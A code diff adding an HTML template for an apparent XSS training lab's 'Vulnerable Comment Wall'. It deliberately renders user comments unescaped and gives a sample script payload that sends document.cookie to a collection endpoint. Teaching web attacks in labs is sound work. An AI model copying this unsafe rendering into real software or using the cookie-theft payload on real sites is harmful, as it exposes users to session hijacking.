@@ -1,0 +1,42 @@
+{% extends "base.html" %}
+
+{% block title %}Vulnerable Wall - Employee Portal{% endblock %}
+
+{% block content %}
+<section class="lab-panel">
+    <p class="eyebrow">Restricted Preview</p>
+    <h2>Vulnerable Comment Wall</h2>
+    <p class="warning">
+        Warning: comments render with <code>{{ '{{ comment.content | safe }}' }}</code> -
+        any HTML or script you post here executes for every visitor. Try:
+        <code>&lt;script&gt;fetch('/modules/xss/collect?value='+document.cookie)&lt;/script&gt;</code>
+        to see the cookie-theft demo, then check
+        <a href="{{ url_for('xss.stolen') }}">Attacker Loot</a>.
+    </p>
+
+    <form method="post" class="auth-form lab-form">
+        <label for="content">Post a comment</label>
+        <textarea id="content" name="content" required></textarea>
+        <button type="submit">Post (unsafe render)</button>
+    </form>
+
+    <div class="query-box" style="margin-top: 20px;">
+        <h3>Wall ({{ comments|length }} comment{{ 's' if comments|length != 1 }})</h3>
+        {% for comment in comments %}
+            <div class="comment-card">
+                <div class="comment-meta">
+                    <span>{{ comment.author }}</span>
+                    <span>{{ comment.created_at }}</span>
+                </div>
+                {{ comment.content | safe }}
+            </div>
+        {% else %}
+            <p>No comments yet.</p>
+        {% endfor %}
+    </div>
+
+    <p class="auth-link">
+        <a href="{{ url_for('xss.index') }}">Back to XSS lab</a>
+    </p>
+</section>
+{% endblock %}
